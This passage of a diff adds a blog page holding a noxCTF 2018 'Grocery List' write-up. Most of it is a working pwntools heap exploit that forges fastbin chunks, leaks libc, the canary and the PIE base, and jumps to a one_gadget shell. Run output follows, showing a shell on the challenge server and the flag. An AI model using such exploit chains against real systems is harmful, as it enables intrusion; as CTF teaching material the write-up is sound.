class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x1b</span>)</span><br><span class="line">edit_item(<span class="number">0</span>, payload)</span><br><span class="line">add_empty(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc = u64(dump_all()[<span class="number">3</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x20830</span></span><br><span class="line">log.info(<span class="string">'libc '</span> + hex(libc))</span><br><span class="line"></span><br><span class="line">remove_item(<span class="number">0</span>)</span><br><span class="line">remove_item(<span class="number">0</span>)</span><br><span class="line">remove_item(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload  = p64(libc + <span class="number">0x20830</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x4100</span>)</span><br><span class="line">edit_item(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">add_empty(<span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line">remove_item(<span class="number">2</span>)</span><br><span class="line">remove_item(<span class="number">2</span>)</span><br><span class="line">payload  = p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(stack - <span class="number">2</span>)</span><br><span class="line">edit_item(<span class="number">1</span>, payload)</span><br><span class="line">add_empty(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">remove_item(<span class="number">1</span>)</span><br><span class="line">remove_item(<span class="number">1</span>)</span><br><span class="line">remove_item(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">canary = u64(dump_all()[<span class="number">1</span>][:<span class="number">7</span>].rjust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">pie = u64(dump_all()[<span class="number">1</span>][<span class="number">7</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x1380</span></span><br><span class="line">log.info(<span class="string">'canary '</span> + hex(canary))</span><br><span class="line">log.info(<span class="string">'pie '</span> + hex(pie))</span><br><span class="line"></span><br><span class="line">add_empty(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">remove_item(<span class="number">3</span>)</span><br><span class="line">remove_item(<span class="number">3</span>)</span><br><span class="line">payload  = p64(<span class="number">0</span>) * <span class="number">13</span></span><br><span class="line">payload += p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">13</span></span><br><span class="line">payload += p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(pie + <span class="number">0x20202d</span>)</span><br><span class="line">edit_item(<span class="number">2</span>, payload)</span><br><span class="line">add_empty(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">remove_item(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, gdbcmd.format(pie))</span></span><br><span class="line">remove_item(<span class="number">2</span>)</span><br><span class="line">remove_item(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload  = p64(libc + <span class="number">0x45216</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(pie + <span class="number">0x1380</span>)</span><br><span class="line">payload += p64(libc + <span class="number">0x45216</span>)</span><br><span class="line">edit_item(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'\x00'</span> * <span class="number">3</span></span><br><span class="line">payload += p64(stack - <span class="number">0xb</span>)</span><br><span class="line">payload += p64(stack - <span class="number">2</span> + <span class="number">16</span>)</span><br><span class="line">payload += p64(pie + <span class="number">0x20203d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">18</span></span><br><span class="line">payload += p64(libc + <span class="number">0x45216</span>)</span><br><span class="line">edit_item(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">_exit()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">λ › python solve.py chal.noxale.com 1232</span><br><span class="line">[+] Opening connection to chal.noxale.com on port 1232: Done</span><br><span class="line">[*] stack 0x7ffec128fb3b</span><br><span class="line">[*] libc 0x7fdf29bb9000</span><br><span class="line">[*] canary 0xedc677284751c5</span><br><span class="line">[*] pie 0x55a4c8cd3000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">Goodbye</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">GroceryList</span><br><span class="line">flag</span><br><span class="line">$ cat flag</span><br><span class="line">noxCTF&#123;I_L0ve_F0rg1ng_Chunk5&#125;</span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to chal.noxale.com port 1232</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#intro"><span class="toc-number">1.</span> <span class="toc-text">intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overflow"><span class="toc-number">2.</span> <span class="toc-text">overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leak"><span class="toc-number">3.</span> <span class="toc-text">leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-attack-forging-chunk"><span class="toc-number">4.</span> <span class="toc-text">fastbin-attack, forging-chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#full-exploit"><span class="toc-number">5.</span> <span class="toc-text">full exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">6.</span> <span class="toc-text">flag</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&text=noxCTF 2018 - Grocery List"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&is_video=false&description=noxCTF 2018 - Grocery List"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=noxCTF 2018 - Grocery List&body=Check out this article: https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&name=noxCTF 2018 - Grocery List&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 zeroload
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zeroload-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
